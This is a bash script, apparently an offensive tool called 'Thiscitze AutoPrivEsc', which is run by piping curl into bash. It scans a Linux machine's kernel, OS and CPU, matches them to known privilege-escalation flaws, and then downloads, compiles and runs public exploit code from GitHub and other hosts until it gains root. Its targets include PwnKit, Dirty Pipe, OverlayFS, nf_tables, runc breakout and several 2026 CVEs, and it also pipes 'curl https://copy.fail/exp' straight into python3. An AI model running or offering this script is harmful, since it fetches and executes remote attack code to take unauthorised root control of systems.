#!/bin/bash
# ============================================
# Thiscitze AutoPrivEsc - Scan -> Match -> Exploit
# Kullanim: curl -fsSL <RAW_URL> | bash
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ===== TOOLS =====
NEED="curl python3"
for T in $NEED; do
    command -v $T >/dev/null 2>&1 || { echo -e "${RED}[-] missing: $T${NC}"; exit 1; }
done
command -v gcc >/dev/null 2>&1 && HAS_GCC=1 || HAS_GCC=0
command -v make >/dev/null 2>&1 && HAS_MAKE=1 || HAS_MAKE=0
command -v git >/dev/null 2>&1 && HAS_GIT=1 || HAS_GIT=0
command -v unzip >/dev/null 2>&1 && HAS_UNZIP=1 || HAS_UNZIP=0
command -v timeout >/dev/null 2>&1 && HAS_TIMEOUT=1 || HAS_TIMEOUT=0
if [ "$HAS_GCC" = "0" ]; then
    echo -e "${YELLOW}[-] gcc not found - skipping compile-based exploits${NC}"
fi

# ===== BANNER =====
echo -e "${RED}"
echo "  ████████╗██╗  ██╗██╗███████╗ ██████╗██╗████████╗███████╗"
echo "  ╚══██╔══╝██║  ██║██║██╔════╝██╔════╝██║╚══██╔══╝██╔════╝"
echo "     ██║   ███████║██║███████╗██║     ██║   ██║   █████╗  "
echo "     ██║   ██╔══██║██║╚════██║██║     ██║   ██║   ██╔══╝  "
echo "     ██║   ██║  ██║██║███████║╚██████╗██║   ██║   ███████╗"
echo "     ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝   ╚═╝   ╚══════╝"
echo -e "${NC}"
echo -e "${GREEN}   AutoPrivEsc  -  Scan -> Match -> Exploit${NC}"
echo -e "${YELLOW}   -------------------------------------------------${NC}"
echo -e "${YELLOW}[*] Scanning system...${NC}"
echo ""

# ===== SYSTEM SCAN =====
KERNEL=$(uname -r)
OS=$(cat /etc/os-release 2>/dev/null | grep "^ID=" | cut -d= -f2 | tr -d '"')
OS_VER=$(cat /etc/os-release 2>/dev/null | grep "VERSION_ID" | cut -d= -f2 | tr -d '"')
ARCH=$(uname -m)
CPU=$(grep "model name" /proc/cpuinfo | head -1 | cut -d: -f2)
HOSTNAME=$(hostname)
KERNEL_MAJ=$(echo $KERNEL | cut -d. -f1)
KERNEL_MIN=$(echo $KERNEL | cut -d. -f2)

echo -e "${CYAN}[SYSTEM]${NC}"
echo "  Kernel : $KERNEL"
echo "  OS     : $OS $OS_VER"
echo "  Arch   : $ARCH"
echo "  CPU    :$CPU"
echo "  Host   : $HOSTNAME"
echo ""

# ===== ROOT CHECK =====
if [ "$(id -u)" = "0" ]; then
    echo -e "${GREEN}[+] Already root. Nothing to do.${NC}"
    exit 0
fi

# ===== HELPERS =====
is_exec_dir() {
    local d="$1"
    mkdir -p "$d" 2>/dev/null || return 1
    [ -w "$d" ] || return 1
    local t="$d/.x_$$"
    printf '#!/bin/sh\nexit 0\n' > "$t" 2>/dev/null || return 1
    chmod +x "$t" 2>/dev/null
    "$t" 2>/dev/null && { rm -f "$t"; return 0; }
    rm -f "$t"
    return 1
}

find_workdir() {
    local base
    if [ -n "${HOME:-}" ] && [ "$HOME" != "/" ]; then base="$HOME/.cache/apex"; else base="/var/tmp/apex"; fi
    for d in "$base" "/var/tmp/apex" "/dev/shm/apex" "/tmp/apex"; do
        if is_exec_dir "$d"; then echo "$d"; return 0; fi
    done
    return 1
}

WRK=$(find_workdir) || { echo -e "${RED}[-] no writable+executable dir found${NC}"; exit 1; }
LOGFILE=$WRK/exploit.log
mkdir -p "$WRK"
: > "$LOGFILE"
cd "$WRK"
echo -e "${CYAN}[WORKDIR] $WRK${NC}"
echo ""

kcfg() {
    grep -qs "^$1=[ym]" /boot/config-$(uname -r) 2>/dev/null && return 0
    zcat /proc/config.gz 2>/dev/null | grep -qs "^$1=[ym]" && return 0
    return 1
}

fetch_repo() {
    local repo="$1" dir="$2"
    rm -rf "$dir" "$dir.tgz"
    if GIT_TERMINAL_PROMPT=0 git clone -q --depth 1 "https://github.com/$repo.git" "$dir" 2>/dev/null; then
        return 0
    fi
    if curl -fsSL "https://codeload.github.com/$repo/tar.gz/refs/heads/main" -o "$dir.tgz" 2>/dev/null; then
        mkdir -p "$dir" && tar xzf "$dir.tgz" -C "$dir" --strip-components=1 2>/dev/null && rm -f "$dir.tgz"
        return 0
    fi
    return 1
}

got_root() {
    echo -e "${RED}"
    echo "  ██████╗  ██████╗  ██████╗ ████████╗     ██████╗  ██████╗ ████████╗ ██████╗ "
    echo "  ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝    ██╔═══██╗██╔═══██╗╚══██╔══╝██╔═══██╗"
    echo "  ██████╔╝██║   ██║██║   ██║   ██║       ██║   ██║██║   ██║   ██║   ██║   ██║"
    echo "  ██╔══██╗██║   ██║██║   ██║   ██║       ██║   ██║██║   ██║   ██║   ██║   ██║"
    echo "  ██║  ██║╚██████╔╝╚██████╔╝   ██║       ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝"
    echo "  ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝        ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ "
    echo -e "${NC}"
    echo -e "${GREEN}[+] UID: $(id -u)  EUID: $(id -u)${NC}"
    id
    echo ""
    echo -e "${GREEN}[+] ROOT! Stopping. Clean up: rm -rf $WRK${NC}"
    exit 0
}

run() {
    echo -e "${CYAN}[>] Trying: $1${NC}"
    echo "==== $1 ====" >> $LOGFILE
    local OUT=$WRK/.out.$$
    if [ "$HAS_TIMEOUT" = "1" ] && command -v setsid >/dev/null 2>&1; then
        setsid bash -c "$1" </dev/null >"$OUT" 2>&1 &
        local PID=$!
        local S=0
        while kill -0 $PID 2>/dev/null && [ $S -lt 90 ]; do
            sleep 1; S=$((S+1))
        done
        if kill -0 $PID 2>/dev/null; then
            echo -e "${YELLOW}    [timeout] killing process group...${NC}"
            kill -- -$PID 2>/dev/null
            sleep 2
            kill -9 -- -$PID 2>/dev/null
            RC=124
        else
            wait $PID 2>/dev/null
            RC=$?
        fi
    else
        timeout -k 5 90 bash -c "$1" </dev/null >"$OUT" 2>&1
        RC=$?
    fi
    sed 's/^/    /' "$OUT" | tee -a $LOGFILE
    rm -f "$OUT"
    if [ "$(id -u)" = "0" ]; then
        echo -e "${GREEN}[+] SUCCESS via: $1${NC}"
        got_root "$1"
    else
        echo -e "${YELLOW}[-] no root (exit code: $RC)${NC}"
        echo ""
    fi
}

# ===== TARGETS =====
echo -e "${CYAN}[CHECKING EXPLOIT TARGETS]${NC}"
echo ""

# --- PwnKit (CVE-2021-4034) ---
if [ "$HAS_GCC" = "1" ] && ( [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ] ); then
    echo -e "${GREEN}[+] pkexec found${NC} -> CVE-2021-4034 (PwnKit)"
    run "curl -fsSL https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/refs/heads/main/cve-2021-4034-poc.c -o pwn.c && gcc pwn.c -o pwn && ./pwn"
fi

# --- PwnKit alt (Rvn0xsy) ---
if [ "$HAS_GCC" = "1" ] && ( [ -x "$(command -v pkexec 2>/dev/null)" ] || [ -f "/usr/bin/pkexec" ] ); then
    echo -e "${GREEN}[+] pkexec found${NC} -> CVE-2021-4034 (alt POC)"
    fetch_repo Rvn0xsy/CVE-2021-4034 rvn && run "cd rvn && gcc cve-2021-4034.c -o exp && ./exp"
fi

# --- Dirty Pipe (CVE-2022-0847) ---
if [ "$HAS_GCC" = "1" ] && [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 8 ] && [ "$KERNEL_MIN" -le 16 ]; then
    echo -e "${GREEN}[+] Kernel 5.$KERNEL_MIN ${NC}-> CVE-2022-0847 (Dirty Pipe)"
    fetch_repo Arinerron/CVE-2022-0847-DirtyPipe-Exploit dp && run "cd dp && gcc exploit.c -o exploit && ./exploit"
fi

# --- GameOver(lay) (CVE-2023-2640 + CVE-2023-32629) ---
if [ "$OS" = "ubuntu" ] && ( lsmod 2>/dev/null | grep -q overlay || [ -d "/sys/module/overlay" ] ); then
    echo -e "${GREEN}[+] Ubuntu + OverlayFS${NC} -> CVE-2023-2640 + CVE-2023-32629"
    run "curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh -o gameover.sh && chmod +x gameover.sh && bash gameover.sh"
fi

# --- DirtyCred ---
if [ "$HAS_GCC" = "1" ] && ( ( [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 14 ] ) || [ "$KERNEL_MAJ" = "6" ] ); then
    echo -e "${GREEN}[+] Kernel 5.14-6.x ${NC}-> DirtyCred"
    fetch_repo PR0fix/DirtyCred dc && run "cd dc && make && ./exploit"
fi

# --- DirtyFrag ---
if [ "$HAS_GCC" = "1" ] && [ "$KERNEL_MAJ" = "6" ] && [ "$KERNEL_MIN" -ge 1 ] && [ "$KERNEL_MIN" -le 6 ]; then
    echo -e "${GREEN}[+] Kernel 6.$KERNEL_MIN ${NC}-> DirtyFrag"
    fetch_repo V4bel/dirtyfrag df && run "cd df && gcc -O0 -Wall -o exp exp.c -lutil && ./exp"
fi

# --- FragNesia ---
if [ "$HAS_GCC" = "1" ] && ( [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 19 ] || [ "$KERNEL_MAJ" = "6" ] && [ "$KERNEL_MIN" -le 8 ] ); then
    echo -e "${GREEN}[+] Kernel 5.19-6.8 ${NC}-> FragNesia"
    fetch_repo v12-security/pocs pocs && run "cd pocs/fragnesia && gcc -o exp fragnesia.c && ./exp"
fi

# --- eBPF Ring Buffer / Verifier LPE ---
if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_BPF_SYSCALL && kcfg CONFIG_BPF && kcfg CONFIG_USER_NS; then
    echo -e "${YELLOW}[~] eBPF enabled${NC} -> eBPF LPE"
    fetch_repo argonsecurity/ebpf-lpe-poc ebpf && run "cd ebpf && make && ./exploit"
else
    echo -e "${YELLOW}[-] skip eBPF (no gcc / BPF disabled)${NC}"
fi

# --- Netfilter / nf_tables (CVE-2023-32233) ---
if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_NF_TABLES; then
    echo -e "${YELLOW}[~] nftables enabled${NC} -> CVE-2023-32233"
    fetch_repo bluefrostsecurity/CVE-2023-32233-PoC nft && run "cd nft && gcc -O2 exploit.c -o exploit -lnftables && ./exploit"
else
    echo -e "${YELLOW}[-] skip nftables (no gcc / CONFIG_NF_TABLES disabled)${NC}"
fi

# --- SLUB Overflow (CVE-2022-29582) ---
if [ "$HAS_GCC" = "1" ] && [ "$KERNEL_MAJ" = "5" ] && [ "$KERNEL_MIN" -ge 10 ] && [ "$KERNEL_MIN" -le 17 ]; then
    echo -e "${GREEN}[+] Kernel 5.$KERNEL_MIN ${NC}-> CVE-2022-29582 (SLUB)"
    fetch_repo Bonfee/CVE-2022-29582 slub && run "cd slub && gcc -O2 exploit.c -o exploit && ./exploit"
fi

# --- io_uring UAF ---
if [ "$HAS_GCC" = "1" ] && kcfg CONFIG_IO_URING; then
    echo -e "${YELLOW}[~] io_uring enabled${NC} -> io_uring LPE"
    fetch_repo kxcode/iouring-exploit-poc iou && run "cd iou && gcc -O2 exploit.c -o exploit -lpthread && ./exploit"
else
    echo -e "${YELLOW}[-] skip io_uring (no gcc / CONFIG_IO_URING disabled)${NC}"
fi

# --- TONTOU (Spectre v2 bypass, AMD Zen 2) ---
if [ "$HAS_GCC" = "1" ] && echo "$CPU" | grep -qi "AMD.*Zen.2\|AMD.*Ryzen.*3[0-9]\|AMD.*EPYC.*7[0-9]"; then
    echo -e "${YELLOW}[~] AMD Zen 2${NC} -> TONTOU"
    run "curl -fsSL https://github.com/CSAIL-Arch-Sec/tontou/archive/refs/heads/main.zip -o tontou.zip && unzip -oq tontou.zip && cd tontou-main && make && ./tontou"
fi

# --- CVE-2026-46215 ---
if [ "$HAS_GCC" = "1" ] && [ "$KERNEL_MAJ" -ge 7 ] 2>/dev/null; then
    echo -e "${YELLOW}[~] Kernel $KERNEL.x${NC} -> CVE-2026-46215"
    fetch_repo bluedragonsecurity/CVE-2026-46215-exploit-linux-7.0-uaf-stable c46215 && run "cd c46215 && gcc -o exploit exploit.c -lpthread -static && ./exploit"
fi

# --- PackageKit (CVE-2026-41651) ---
if dpkg -l 2>/dev/null | grep -qi packagekit || rpm -qa 2>/dev/null | grep -qi PackageKit; then
    echo -e "${GREEN}[+] PackageKit installed${NC} -> CVE-2026-41651"
    fetch_repo Vozec/CVE-2026-41651 pk && run "cd pk && chmod +x cve-2026-41651 && ./cve-2026-41651"
fi

# --- Polkit / DBus (CVE-2021-3560) ---
if [ -f "/usr/bin/pkexec" ] || [ -f "/usr/bin/polkit-agent-helper-1" ]; then
    echo -e "${GREEN}[+] Polkit present${NC} -> CVE-2021-3560"
    fetch_repo cybersecurityworks/CVE-2021-3560-Exploit-POC p3560 && run "cd p3560 && python3 cve-2021-3560.py"
fi

# --- runc Container Breakout (CVE-2024-21626) ---
if ls /proc/*/exe 2>/dev/null | grep -q .; then
    echo -e "${YELLOW}[~] Container-like /proc detected${NC} -> runc breakout (CVE-2024-21626)"
    fetch_repo snyk/CVE-2024-21626-PoC runc && run "cd runc && bash exploit.sh"
fi

# --- OVSwrap ---
if lsmod 2>/dev/null | grep -q openvswitch || [ -d "/sys/module/openvswitch" ]; then
    echo -e "${GREEN}[+] Open vSwitch loaded${NC} -> OVSwrap"
    fetch_repo manizada/OVSwrap ovs && run "cd ovs && python3 ovswrap-poc.py"
fi

# --- CVE-2026-31431 ---
if [ "$HAS_UNZIP" = "1" ]; then
    echo -e "${YELLOW}[~] Trying CVE-2026-31431${NC}"
    run "curl -fsSL https://github.com/JuanBindez/CVE-2026-31431/archive/refs/heads/main.zip -o c31431.zip && unzip -oq c31431.zip && cd CVE-2026-31431-main && python3 main.py"
fi

# --- CVE-2026-46300 (hazir binary, derleme gerekmez) ---
echo -e "${YELLOW}[~] Trying CVE-2026-46300${NC}"
fetch_repo ExploitEoom/CVE-2026-46300 c46300 && run "cd c46300 && chmod +x exploit && ./exploit"

# --- CVE-2026-64600 ---
if [ "$HAS_GCC" = "1" ]; then
    echo -e "${YELLOW}[~] Trying CVE-2026-64600${NC}"
    fetch_repo Debajyoti0-0/CVE-2026-64600 c64600 && run "cd c64600 && gcc -o cve-2026-64600 cve-2026-64600.c -lm -lpthread && ./cve-2026-64600"
fi

# --- CVE-2026-68138 ---
if [ "$HAS_GCC" = "1" ]; then
    echo -e "${YELLOW}[~] Trying CVE-2026-68138${NC}"
    fetch_repo aramosf/CVE-2026-68138 c68138 && run "cd c68138 && bash build.sh && ./build/exploit"
fi

# --- CVE-2026-68398 (gcc) ---
if [ "$HAS_GCC" = "1" ]; then
    echo -e "${YELLOW}[~] Trying CVE-2026-68398 (gcc)${NC}"
    fetch_repo aramosf/cve-2026-68398 c68398 && run "cd c68398 && gcc -O2 exploit.c kaslr_prefetch.c -o exploit -lpthread && ./exploit"
fi

# --- CVE-2026-68398 (make) ---
if [ "$HAS_MAKE" = "1" ]; then
    echo -e "${YELLOW}[~] Trying CVE-2026-68398 (make)${NC}"
    fetch_repo aramosf/cve-2026-68398 c68398b && run "cd c68398b && make && ./build/CVE-2026-68398"
fi

# --- copy.fail exp ---
echo -e "${YELLOW}[~] Trying copy.fail exp${NC}"
run "curl https://copy.fail/exp | python3 && su"

# ===== RESULT =====
echo "================================================"
if [ "$(id -u)" = "0" ]; then
    echo -e "${GREEN}[+] ROOT GOT!${NC}"
    id
else
    echo -e "${RED}[-] All exploits failed. No root obtained.${NC}"
    echo -e "${RED}[-] Full log: $LOGFILE${NC}"
    echo -e "${YELLOW}[-] Common causes: hardened kernel (grsec), missing SUID, noexec workdir, patched kernel, fake repos${NC}"
    echo -e "${YELLOW}[-] Clean up: rm -rf $WRK${NC}"
fi
